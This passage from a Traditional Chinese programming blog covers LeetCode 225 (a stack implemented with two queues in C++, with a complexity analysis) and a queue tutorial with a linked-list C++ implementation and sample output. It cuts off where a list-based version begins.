<code>q1</code> 是否為空，如果回空直接返回。接著就是迭代 <code>q1</code> queue，將除了最後一個資料的其他資料從 <code>q1</code> 移動到 <code>q2</code>，一旦發現最後一個資料，將它保存在　<code>result</code> 變數中，並將最後元素從 <code>q1</code> pop 出來，接著將 <code>q2</code> queue中資料全部移動回 <code>q1</code>，方便下一次的 push操作。最後就是回傳 <code>result</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> size = q1.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">if</span>(q1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==size<span class="number">-1</span>) &#123;</span><br><span class="line">            result = q1.<span class="built_in">front</span>();</span><br><span class="line">            q1.<span class="built_in">pop</span>();</span><br><span class="line">            size = q2.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">                q1.<span class="built_in">push</span>(q2.<span class="built_in">front</span>());</span><br><span class="line">                q2.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            size =<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            q2.<span class="built_in">push</span>(q1.<span class="built_in">front</span>());</span><br><span class="line">            q1.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>top</code> 函數用來檢查stack的最頂端資料值，但以queue的角度看會是最後進入queue的末端元素，因此直接使用 <code>back()</code> 回傳資料值，當然一樣要先檢查 <code>q1</code> 是否為空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!q1.<span class="built_in">empty</span>()) <span class="keyword">return</span> q1.<span class="built_in">back</span>();</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>empty()</code> 函數就是確認stack是否為空，而這裡也就是要確認queue是否為空。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(q1.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/225/result.jpeg"></p><h3 id="完整程式碼"><a href="#完整程式碼" class="headerlink" title="完整程式碼"></a>完整程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q1;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt;q2;</span><br><span class="line">    <span class="built_in">MyStack</span>() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        q1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> size = q1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            <span class="comment">//the last element in the queue</span></span><br><span class="line">            <span class="keyword">if</span>(i==size<span class="number">-1</span>) &#123;</span><br><span class="line">                result = q1.<span class="built_in">front</span>();</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="comment">//copy q2 to q1</span></span><br><span class="line">                size = q2.<span class="built_in">size</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; size; j++) &#123;</span><br><span class="line">                    q1.<span class="built_in">push</span>(q2.<span class="built_in">front</span>());</span><br><span class="line">                    q2.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                size =<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                q2.<span class="built_in">push</span>(q1.<span class="built_in">front</span>());</span><br><span class="line">                q1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q1.<span class="built_in">empty</span>()) <span class="keyword">return</span> q1.<span class="built_in">back</span>();</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q1.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    MyStack sk;</span><br><span class="line">    sk.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Stack push: 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">push</span>(<span class="number">2</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Stack push: 2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">push</span>(<span class="number">3</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Stack push: 3&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Pop the top element, which is: &quot;</span> &lt;&lt;  sk.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// sk.push(4);</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;Stack push: 4&quot; &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">// cout &lt;&lt; &quot;Pop the top element, which is:&quot; &lt;&lt;  sk.pop() &lt;&lt; endl;</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Pop the top element, which is:&quot;</span> &lt;&lt;  sk.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Pop the top element, which is:&quot;</span> &lt;&lt;  sk.<span class="built_in">pop</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Is the stack empty? &quot;</span> &lt;&lt; sk.<span class="built_in">empty</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Check the top element:&quot;</span> &lt;&lt; sk.<span class="built_in">top</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li><code>push(int x)</code> 的時間複雜度為 $O(1)$</li><li><code>pop()</code> 的時間複雜度為 $O(n)$，第一次 for 循環將 <code>q1</code> 中的元素轉移到 <code>q2</code>，除了最後一個元素。這需要 $O(n)$ 的時間，其中 <code>n</code> 是 <code>q1</code> 的大小。第二次 for 將 <code>q2</code> 中的元素轉移回 <code>q1</code>，這也需要 $O(n)$ 的時間</li><li><code>top()</code> 的時間複雜度為 $O(1)$</li><li><code>empty()</code> 的時間複雜度為 $O(1)$</li></ul><p>整體的空間複雜度為 $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>使用兩個 queue來儲存資料，每個queue可能包含n個元素，因此整體會是 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
            <tag> Queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 佇列 (Queue) | LeetCode 筆記</title>
      <link href="/posts/22a8b30b.html"/>
      <url>/posts/22a8b30b.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-Queue"><a href="#甚麼是-Queue" class="headerlink" title="甚麼是 Queue?"></a>甚麼是 Queue?</h1><p>Queue 也是一種資料結構，用於暫時儲存元素 ，它與 Stack 不同的是，它是屬於 <strong>FIFO (First-In-First-Out)</strong> 的特性，也就是先進入 Queue 的元素先出來，並且新元素會被加入到 Queue 的尾端。</p><p>通常 Queue 會被應用在需要具有順序一致性的系統中，像是網路封包處理、OS的 Process Schedule, BFS等等，反正就是想像是在排隊買票的感覺。</p><h2 id="Queue-操作"><a href="#Queue-操作" class="headerlink" title="Queue 操作:"></a>Queue 操作:</h2><ul><li>隊伍前方: <code>front</code></li><li>隊伍後方: <code>back</code></li><li>進入隊伍: <code>push</code>, 一定只能從 <code>back</code> 進入</li><li>離開隊伍: <code>pop</code>, 一定只能從 <code>front</code> 離開</li></ul><!-- 可以插入手繪圖片 --><ul><li><code>Push(data)</code>: 將 data 從 back 放入Queue， 並更新成新的back，在Queue 中新增資料又稱 <code>enqueue</code></li><li><code>Pop</code>: 把 front 指向的資料從Queue 中移除，並且更新front，從Queue中移除資料的行為又稱 <code>dequeue</code></li><li><code>getFront</code>: 回傳 front 所指向的資料</li><li><code>getBack</code>: 回傳 back 所指向的資料</li><li><code>IsEmpty</code>: 檢查 Queue 中是否有資料</li><li><code>getSize</code>: 回傳 Queue 中的資料個數</li></ul><h1 id="Queue-實作-C"><a href="#Queue-實作-C" class="headerlink" title="Queue 實作 (C++)"></a>Queue 實作 (C++)</h1><h2 id="以-Linked-List-實踐-Queue"><a href="#以-Linked-List-實踐-Queue" class="headerlink" title="以 Linked List 實踐 Queue"></a>以 Linked List 實踐 Queue</h2><p><img src="/img/LeetCode/queue/queue1.png"></p><ul><li>Queue中的 front 即為 linked list 中的 first node，而back則為list中的最後一個節點</li><li>但由於一個 Queue 會需要，getfront 跟 getBack，因此除了會需要有個 pointer紀錄front節點，還需要一個pointer 紀錄back節點</li></ul><h3 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QueueNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    QueueNode *next;</span><br><span class="line">    <span class="built_in">QueueNode</span>(): <span class="built_in">data</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">    <span class="built_in">QueueNode</span>(<span class="type">int</span> x):<span class="built_in">data</span>(x), <span class="built_in">next</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QueueList</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        QueueNode *front;</span><br><span class="line">        QueueNode *back;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">QueueList</span>(): <span class="built_in">front</span>(<span class="number">0</span>), <span class="built_in">back</span>(<span class="number">0</span>), <span class="built_in">size</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getFront</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getBack</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">IsEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Push</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        front = <span class="keyword">new</span> <span class="built_in">QueueNode</span>(x);</span><br><span class="line">        back = front;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    QueueNode *newNode = <span class="keyword">new</span> <span class="built_in">QueueNode</span>(x);</span><br><span class="line">    back-&gt;next = newNode;</span><br><span class="line">    back = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QueueList::Pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        QueueNode *tempNode = front;</span><br><span class="line">        front = front-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> tempNode;</span><br><span class="line">        tempNode = <span class="number">0</span>;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getFront</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> front-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getBack</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> back-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">QueueList::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueList::IsEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    QueueList q;</span><br><span class="line">    <span class="keyword">if</span>(q.<span class="built_in">IsEmpty</span>())&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;empty queue&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">24</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 24: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 8: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">23</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 23: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">13</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 13: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;     back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Push</span>(<span class="number">35</span>);</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After push 35: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;     back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    std::cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;front: &quot;</span> &lt;&lt; q.<span class="built_in">getFront</span>() &lt;&lt; <span class="string">&quot;    back: &quot;</span> &lt;&lt; q.<span class="built_in">getBack</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line">    cout&lt;&lt; <span class="string">&quot;After pop the front element: \n&quot;</span>; </span><br><span class="line">    q.<span class="built_in">Pop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>輸出結果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">empty queue</span><br><span class="line"> After push 24:  //1</span><br><span class="line">front: 24    back: 24 </span><br><span class="line">After push 8:   //2</span><br><span class="line">front: 24    back: 8</span><br><span class="line">After push 23:  //3</span><br><span class="line">front: 24    back: 23</span><br><span class="line">After push 13:  //4</span><br><span class="line">front: 24    back: 13</span><br><span class="line">After pop the front element:  //5</span><br><span class="line">After push 35: front: 8 back: 35 //6</span><br><span class="line">After pop the front element: front: 23 back: 35  //7</span><br><span class="line">After pop the front element: front: 13 back: 35 //8</span><br><span class="line">After pop the front element: front: 35 back: 35 //9</span><br><span class="line">After pop the front element: Queue is empty. //10</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/queue/queue2.png"></p><h2 id="以-List-實踐-Queue"><a href="#以-List-實踐-Queue" class="headerlink" title="以 List 實踐 Queue"></a>以 List 實踐 Queue</h2><h3 id="程式碼-1"><a href="#程式碼-1" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 